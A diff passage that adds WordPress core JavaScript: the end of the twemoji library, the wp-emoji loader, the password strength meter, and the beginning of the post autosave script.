+                return g.lastIndex = 0, d
+            }
+        },
+        u = {
+            "&": "&amp;",
+            "<": "&lt;",
+            ">": "&gt;",
+            "'": "&#39;",
+            '"': "&quot;"
+        },
+        g = /(?:\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d[\udc68\udc69]|\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c[\udffc-\udfff]|\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c[\udffb\udffd-\udfff]|\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c[\udffb-\udffd\udfff]|\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c[\udffb-\udffe]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d[\udc68\udc69]|\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1|\ud83d\udc6b\ud83c[\udffb-\udfff]|\ud83d\udc6c\ud83c[\udffb-\udfff]|\ud83d\udc6d\ud83c[\udffb-\udfff]|\ud83d\udc8f\ud83c[\udffb-\udfff]|\ud83d\udc91\ud83c[\udffb-\udfff]|\ud83e\udd1d\ud83c[\udffb-\udfff]|\ud83d[\udc6b-\udc6d\udc8f\udc91]|\ud83e\udd1d)|(?:\ud83d[\udc68\udc69]|\ud83e\uddd1)(?:\ud83c[\udffb-\udfff])?\u200d(?:\u2695\ufe0f|\u2696\ufe0f|\u2708\ufe0f|\ud83c[\udf3e\udf73\udf7c\udf84\udf93\udfa4\udfa8\udfeb\udfed]|\ud83d[\udcbb\udcbc\udd27\udd2c\ude80\ude92]|\ud83e[\uddaf-\uddb3\uddbc\uddbd])|(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75]|\u26f9)((?:\ud83c[\udffb-\udfff]|\ufe0f)\u200d[\u2640\u2642]\ufe0f)|(?:\ud83c[\udfc3\udfc4\udfca]|\ud83d[\udc6e\udc70\udc71\udc73\udc77\udc81\udc82\udc86\udc87\ude45-\ude47\ude4b\ude4d\ude4e\udea3\udeb4-\udeb6]|\ud83e[\udd26\udd35\udd37-\udd39\udd3d\udd3e\uddb8\uddb9\uddcd-\uddcf\uddd4\uddd6-\udddd])(?:\ud83c[\udffb-\udfff])?\u200d[\u2640\u2642]\ufe0f|(?:\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f|\ud83c\udff3\ufe0f\u200d\ud83c\udf08|\ud83d\ude36\u200d\ud83c\udf2b\ufe0f|\u2764\ufe0f\u200d\ud83d\udd25|\u2764\ufe0f\u200d\ud83e\ude79|\ud83c\udff4\u200d\u2620\ufe0f|\ud83d\udc15\u200d\ud83e\uddba|\ud83d\udc3b\u200d\u2744\ufe0f|\ud83d\udc41\u200d\ud83d\udde8|\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc6f\u200d\u2640\ufe0f|\ud83d\udc6f\u200d\u2642\ufe0f|\ud83d\ude2e\u200d\ud83d\udca8|\ud83d\ude35\u200d\ud83d\udcab|\ud83e\udd3c\u200d\u2640\ufe0f|\ud83e\udd3c\u200d\u2642\ufe0f|\ud83e\uddde\u200d\u2640\ufe0f|\ud83e\uddde\u200d\u2642\ufe0f|\ud83e\udddf\u200d\u2640\ufe0f|\ud83e\udddf\u200d\u2642\ufe0f|\ud83d\udc08\u200d\u2b1b|\ud83d\udc26\u200d\u2b1b)|[#*0-9]\ufe0f?\u20e3|(?:[\xa9\xae\u2122\u265f]\ufe0f)|(?:\ud83c[\udc04\udd70\udd71\udd7e\udd7f\ude02\ude1a\ude2f\ude37\udf21\udf24-\udf2c\udf36\udf7d\udf96\udf97\udf99-\udf9b\udf9e\udf9f\udfcd\udfce\udfd4-\udfdf\udff3\udff5\udff7]|\ud83d[\udc3f\udc41\udcfd\udd49\udd4a\udd6f\udd70\udd73\udd76-\udd79\udd87\udd8a-\udd8d\udda5\udda8\uddb1\uddb2\uddbc\uddc2-\uddc4\uddd1-\uddd3\udddc-\uddde\udde1\udde3\udde8\uddef\uddf3\uddfa\udecb\udecd-\udecf\udee0-\udee5\udee9\udef0\udef3]|[\u203c\u2049\u2139\u2194-\u2199\u21a9\u21aa\u231a\u231b\u2328\u23cf\u23ed-\u23ef\u23f1\u23f2\u23f8-\u23fa\u24c2\u25aa\u25ab\u25b6\u25c0\u25fb-\u25fe\u2600-\u2604\u260e\u2611\u2614\u2615\u2618\u2620\u2622\u2623\u2626\u262a\u262e\u262f\u2638-\u263a\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267b\u267f\u2692-\u2697\u2699\u269b\u269c\u26a0\u26a1\u26a7\u26aa\u26ab\u26b0\u26b1\u26bd\u26be\u26c4\u26c5\u26c8\u26cf\u26d1\u26d3\u26d4\u26e9\u26ea\u26f0-\u26f5\u26f8\u26fa\u26fd\u2702\u2708\u2709\u270f\u2712\u2714\u2716\u271d\u2721\u2733\u2734\u2744\u2747\u2757\u2763\u2764\u27a1\u2934\u2935\u2b05-\u2b07\u2b1b\u2b1c\u2b50\u2b55\u3030\u303d\u3297\u3299])(?:\ufe0f|(?!\ufe0e))|(?:(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75\udd90]|\ud83e\udef0|[\u261d\u26f7\u26f9\u270c\u270d])(?:\ufe0f|(?!\ufe0e))|(?:\ud83c[\udf85\udfc2-\udfc4\udfc7\udfca]|\ud83d[\udc42\udc43\udc46-\udc50\udc66-\udc69\udc6e\udc70-\udc78\udc7c\udc81-\udc83\udc85-\udc87\udcaa\udd7a\udd95\udd96\ude45-\ude47\ude4b-\ude4f\udea3\udeb4-\udeb6\udec0\udecc]|\ud83e[\udd0c\udd0f\udd18-\udd1c\udd1e\udd1f\udd26\udd30-\udd39\udd3d\udd3e\udd77\uddb5\uddb6\uddb8\uddb9\uddbb\uddcd-\uddcf\uddd1-\udddd\udec3-\udec5\udef1-\udef8]|[\u270a\u270b]))(?:\ud83c[\udffb-\udfff])?|(?:\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f|\ud83c\udde6\ud83c[\udde8-\uddec\uddee\uddf1\uddf2\uddf4\uddf6-\uddfa\uddfc\uddfd\uddff]|\ud83c\udde7\ud83c[\udde6\udde7\udde9-\uddef\uddf1-\uddf4\uddf6-\uddf9\uddfb\uddfc\uddfe\uddff]|\ud83c\udde8\ud83c[\udde6\udde8\udde9\uddeb-\uddee\uddf0-\uddf5\uddf7\uddfa-\uddff]|\ud83c\udde9\ud83c[\uddea\uddec\uddef\uddf0\uddf2\uddf4\uddff]|\ud83c\uddea\ud83c[\udde6\udde8\uddea\uddec\udded\uddf7-\uddfa]|\ud83c\uddeb\ud83c[\uddee-\uddf0\uddf2\uddf4\uddf7]|\ud83c\uddec\ud83c[\udde6\udde7\udde9-\uddee\uddf1-\uddf3\uddf5-\uddfa\uddfc\uddfe]|\ud83c\udded\ud83c[\uddf0\uddf2\uddf3\uddf7\uddf9\uddfa]|\ud83c\uddee\ud83c[\udde8-\uddea\uddf1-\uddf4\uddf6-\uddf9]|\ud83c\uddef\ud83c[\uddea\uddf2\uddf4\uddf5]|\ud83c\uddf0\ud83c[\uddea\uddec-\uddee\uddf2\uddf3\uddf5\uddf7\uddfc\uddfe\uddff]|\ud83c\uddf1\ud83c[\udde6-\udde8\uddee\uddf0\uddf7-\uddfb\uddfe]|\ud83c\uddf2\ud83c[\udde6\udde8-\udded\uddf0-\uddff]|\ud83c\uddf3\ud83c[\udde6\udde8\uddea-\uddec\uddee\uddf1\uddf4\uddf5\uddf7\uddfa\uddff]|\ud83c\uddf4\ud83c\uddf2|\ud83c\uddf5\ud83c[\udde6\uddea-\udded\uddf0-\uddf3\uddf7-\uddf9\uddfc\uddfe]|\ud83c\uddf6\ud83c\udde6|\ud83c\uddf7\ud83c[\uddea\uddf4\uddf8\uddfa\uddfc]|\ud83c\uddf8\ud83c[\udde6-\uddea\uddec-\uddf4\uddf7-\uddf9\uddfb\uddfd-\uddff]|\ud83c\uddf9\ud83c[\udde6\udde8\udde9\uddeb-\udded\uddef-\uddf4\uddf7\uddf9\uddfb\uddfc\uddff]|\ud83c\uddfa\ud83c[\udde6\uddec\uddf2\uddf3\uddf8\uddfe\uddff]|\ud83c\uddfb\ud83c[\udde6\udde8\uddea\uddec\uddee\uddf3\uddfa]|\ud83c\uddfc\ud83c[\uddeb\uddf8]|\ud83c\uddfd\ud83c\uddf0|\ud83c\uddfe\ud83c[\uddea\uddf9]|\ud83c\uddff\ud83c[\udde6\uddf2\uddfc]|\ud83c[\udccf\udd8e\udd91-\udd9a\udde6-\uddff\ude01\ude32-\ude36\ude38-\ude3a\ude50\ude51\udf00-\udf20\udf2d-\udf35\udf37-\udf7c\udf7e-\udf84\udf86-\udf93\udfa0-\udfc1\udfc5\udfc6\udfc8\udfc9\udfcf-\udfd3\udfe0-\udff0\udff4\udff8-\udfff]|\ud83d[\udc00-\udc3e\udc40\udc44\udc45\udc51-\udc65\udc6a\udc6f\udc79-\udc7b\udc7d-\udc80\udc84\udc88-\udc8e\udc90\udc92-\udca9\udcab-\udcfc\udcff-\udd3d\udd4b-\udd4e\udd50-\udd67\udda4\uddfb-\ude44\ude48-\ude4a\ude80-\udea2\udea4-\udeb3\udeb7-\udebf\udec1-\udec5\uded0-\uded2\uded5-\uded7\udedc-\udedf\udeeb\udeec\udef4-\udefc\udfe0-\udfeb\udff0]|\ud83e[\udd0d\udd0e\udd10-\udd17\udd20-\udd25\udd27-\udd2f\udd3a\udd3c\udd3f-\udd45\udd47-\udd76\udd78-\uddb4\uddb7\uddba\uddbc-\uddcc\uddd0\uddde-\uddff\ude70-\ude7c\ude80-\ude88\ude90-\udebd\udebf-\udec2\udece-\udedb\udee0-\udee8]|[\u23e9-\u23ec\u23f0\u23f3\u267e\u26ce\u2705\u2728\u274c\u274e\u2753-\u2755\u2795-\u2797\u27b0\u27bf\ue50a])|\ufe0f/g,
+        f = /\uFE0F/g,
+        c = String.fromCharCode(8205),
+        t = /[&<>'"]/g,
+        m = /^(?:iframe|noframes|noscript|script|select|style|textarea)$/,
+        e = String.fromCharCode;
+    return h;
+
+    function x(d, u) {
+        return document.createTextNode(u ? d.replace(f, "") : d)
+    }
+
+    function b(d, u) {
+        return "".concat(u.base, u.size, "/", d, u.ext)
+    }
+
+    function N(d) {
+        return o(d.indexOf(c) < 0 ? d.replace(f, "") : d)
+    }
+
+    function r(d) {
+        return u[d]
+    }
+
+    function a() {
+        return null
+    }
+
+    function n(d, u) {
+        return String(d).replace(g, u)
+    }
+
+    function o(d, u) {
+        for (var f = [], c = 0, e = 0, b = 0; b < d.length;) c = d.charCodeAt(b++), e ? (f.push((65536 + (e - 55296 << 10) + (c - 56320)).toString(16)), e = 0) : 55296 <= c && c <= 56319 ? e = c : f.push(c.toString(16));
+        return f.join(u || "-")
+    }
+}();
+// Source: wp-includes/js/wp-emoji.min.js
+! function(c, l) {
+    c.wp = c.wp || {}, c.wp.emoji = new function() {
+        var n, u, e = c.MutationObserver || c.WebKitMutationObserver || c.MozMutationObserver,
+            a = c.document,
+            t = !1,
+            r = 0,
+            o = 0 < c.navigator.userAgent.indexOf("Trident/7.0");
+
+        function i() {
+            return !a.implementation.hasFeature || a.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image", "1.1")
+        }
+
+        function s() {
+            if (!t) {
+                if (void 0 === c.twemoji) return 600 < r ? void 0 : (c.clearTimeout(u), u = c.setTimeout(s, 50), void r++);
+                n = c.twemoji, t = !0, e && new e(function(u) {
+                    for (var e, t, n, a, r = u.length; r--;) {
+                        if (e = u[r].addedNodes, t = u[r].removedNodes, 1 === (n = e.length) && 1 === t.length && 3 === e[0].nodeType && "IMG" === t[0].nodeName && e[0].data === t[0].alt && "load-failed" === t[0].getAttribute("data-error")) return;
+                        for (; n--;) {
+                            if (3 === (a = e[n]).nodeType) {
+                                if (!a.parentNode) continue;
+                                if (o)
+                                    for (; a.nextSibling && 3 === a.nextSibling.nodeType;) a.nodeValue = a.nodeValue + a.nextSibling.nodeValue, a.parentNode.removeChild(a.nextSibling);
+                                a = a.parentNode
+                            }
+                            d(a.textContent) && f(a)
+                        }
+                    }
+                }).observe(a.body, {
+                    childList: !0,
+                    subtree: !0
+                }), f(a.body)
+            }
+        }
+
+        function d(u) {
+            return !!u && (/[\uDC00-\uDFFF]/.test(u) || /[\u203C\u2049\u20E3\u2122\u2139\u2194-\u2199\u21A9\u21AA\u2300\u231A\u231B\u2328\u2388\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638\u2639\u263A\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692\u2693\u2694\u2696\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753\u2754\u2755\u2757\u2763\u2764\u2795\u2796\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05\u2B06\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]/.test(u))
+        }
+
+        function f(u, e) {
+            var t;
+            return !l.supports.everything && n && u && ("string" == typeof u || u.childNodes && u.childNodes.length) ? (e = e || {}, t = {
+                base: i() ? l.svgUrl : l.baseUrl,
+                ext: i() ? l.svgExt : l.ext,
+                className: e.className || "emoji",
+                callback: function(u, e) {
+                    switch (u) {
+                        case "a9":
+                        case "ae":
+                        case "2122":
+                        case "2194":
+                        case "2660":
+                        case "2663":
+                        case "2665":
+                        case "2666":
+                            return !1
+                    }
+                    return !(l.supports.everythingExceptFlag && !/^1f1(?:e[6-9a-f]|f[0-9a-f])-1f1(?:e[6-9a-f]|f[0-9a-f])$/.test(u) && !/^(1f3f3-fe0f-200d-1f308|1f3f4-200d-2620-fe0f)$/.test(u)) && "".concat(e.base, u, e.ext)
+                },
+                attributes: function() {
+                    return {
+                        role: "img"
+                    }
+                },
+                onerror: function() {
+                    n.parentNode && (this.setAttribute("data-error", "load-failed"), n.parentNode.replaceChild(a.createTextNode(n.alt), n))
+                },
+                doNotParse: function(u) {
+                    return !(!u || !u.className || "string" != typeof u.className || -1 === u.className.indexOf("wp-exclude-emoji"))
+                }
+            }, "object" == typeof e.imgAttr && (t.attributes = function() {
+                return e.imgAttr
+            }), n.parse(u, t)) : u
+        }
+        return l && (l.DOMReady ? s() : l.readyCallback = s), {
+            parse: f,
+            test: d
+        }
+    }
+}(window, window._wpemojiSettings);
+window.wp = window.wp || {},
+    function(a) {
+        var e = wp.i18n.__,
+            n = wp.i18n.sprintf;
+        wp.passwordStrength = {
+            meter: function(e, n, t) {
+                return Array.isArray(n) || (n = [n.toString()]), e != t && t && 0 < t.length ? 5 : void 0 === window.zxcvbn ? -1 : zxcvbn(e, n).score
+            },
+            userInputBlacklist: function() {
+                return window.console.log(n(e("%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code."), "wp.passwordStrength.userInputBlacklist()", "5.5.0", "wp.passwordStrength.userInputDisallowedList()")), wp.passwordStrength.userInputDisallowedList()
+            },
+            userInputDisallowedList: function() {
+                var e, n, t, r, s = [],
+                    i = [],
+                    o = ["user_login", "first_name", "last_name", "nickname", "display_name", "email", "url", "description", "weblog_title", "admin_email"];
+                for (s.push(document.title), s.push(document.URL), n = o.length, e = 0; e < n; e++) 0 !== (r = a("#" + o[e])).length && (s.push(r[0].defaultValue), s.push(r.val()));
+                for (t = s.length, e = 0; e < t; e++) s[e] && (i = i.concat(s[e].replace(/\W/g, " ").split(" ")));
+                return i = a.grep(i, function(e, n) {
+                    return !("" === e || e.length < 4) && a.inArray(e, i) === n
+                })
+            }
+        }, window.passwordStrength = wp.passwordStrength.meter
+    }(jQuery);
+
+
+/**
+ * @output wp-includes/js/autosave.js
+ */
+
+/* global tinymce, wpCookies, autosaveL10n, switchEditors */
+// Back-compat.
+window.autosave = function() {
+	return true;
+};
+
+/**
+ * Adds autosave to the window object on dom ready.
+ *
+ * @since 3.9.0
+ *
+ * @param {jQuery} $ jQuery object.
+ * @param {window} The window object.
+ *
+ */
+( function( $, window ) {
+	/**
+	 * Auto saves the post.
+	 *
+	 * @since 3.9.0
+	 *
+	 * @return {Object}
+	 * 	{{
+	 * 		getPostData: getPostData,
+	 * 		getCompareString: getCompareString,
+	 * 		disableButtons: disableButtons,
+	 * 		enableButtons: enableButtons,
+	 * 		local: ({hasStorage, getSavedPostData, save, suspend, resume}|*),
+	 * 		server: ({tempBlockSave, triggerSave, postChanged, suspend, resume}|*)
+	 * 	}}
+	 * 	The object with all functions for autosave.
+	 */
+	function autosave() {
+		var initialCompareString,
+			initialCompareData = {},
+			lastTriggerSave    = 0,
+			$document          = $( document );
+
+		/**
+		 * Sets the initial compare data.
+		 *
+		 * @since 5.6.1
+		 */
+		function setInitialCompare() {
+			initialCompareData = {
+				post_title: $( '#title' ).val() || '',
+				content: $( '#content' ).val() || '',
+				excerpt: $( '#excerpt' ).val() || ''
+			};
+
+			initialCompareString = getCompareString( initialCompareData );
+		}
+
+		/**
+		 * Returns the data saved in both local and remote autosave.
+		 *
+		 * @since 3.9.0
+		 *
+		 * @param {string} type The type of autosave either local or remote.
+		 *
+		 * @return {Object} Object containing the post data.
+		 */
+		function getPostData( type ) {
+			var post_name, parent_id, data,
+				time = ( new Date() ).getTime(),
+				cats = [],
+				editor = getEditor();
+
+			// Don't run editor.save() more often than every 3 seconds.
+			// It is resource intensive and might slow down typing in long posts on slow devices.
+			if ( editor && editor.isDirty() && ! editor.isHidden() && time - 3000 > lastTriggerSave ) {
+				editor.save();
+				lastTriggerSave = time;
+			}
+
+			data = {
+				post_id: $( '#post_ID' ).val() || 0,
+				post_type: $( '#post_type' ).val() || '',
+				post_author: $( '#post_author' ).val() || '',
+				post_title: $( '#title' ).val() || '',
+				content: $( '#content' ).val() || '',
+				excerpt: $( '#excerpt' ).val() || ''
+			};
+
+			if ( type === 'local' ) {
+				return data;
+			}
+
+			$( 'input[id^="in-category-"]:checked' ).each( function() {
+				cats.push( this.value );
+			});
+			data.catslist = cats.join(',');
+
+			if ( post_name = $( '#post_name' ).val() ) {
+				data.post_name = post_name;
+			}
+
+			if ( parent_id = $( '#parent_id' ).val() ) {
+				data.parent_id = parent_id;
+			}
+
+			if ( $( '#comment_status' ).prop( 'checked' ) ) {
+				data.comment_status = 'open';
+			}
+
+			if ( $( '#ping_status' ).prop( 'checked' ) ) {
+				data.ping_status = 'open';
+			}
+
+			if ( $( '#auto_draft' ).val() === '1' ) {
+				data.auto_draft = '1';
+			}
+
+			return data;
+		}
+
+		/**
+		 * Concatenates the title, content and excerpt. This is used to track changes
+		 * when auto-saving.
+		 *
+		 * @since 3.9.0
+		 *
+		 * @param {Object} postData The object containing the post data.
+		 *
+		 * @return {string} A concatenated string with title, content and excerpt.
+		 */
+		function getCompareString( postData ) {
+			if ( typeof postData === 'object' ) {
+				return ( postData.post_title || '' ) + '::' + ( postData.content || '' ) + '::' + ( postData.excerpt || '' );
+			}
+
+			return ( $('#title').val() || '' ) + '::' + ( $('#content').val() || '' ) + '::' + ( $('#excerpt').val() || '' );
+		}
+
+		/**
+		 * Disables save buttons.
+		 *
+		 * @since 3.9.0
+		 *
+		 * @return {void}
+		 */
+		function disableButtons() {
+			$document.trigger('autosave-disable-buttons');
+
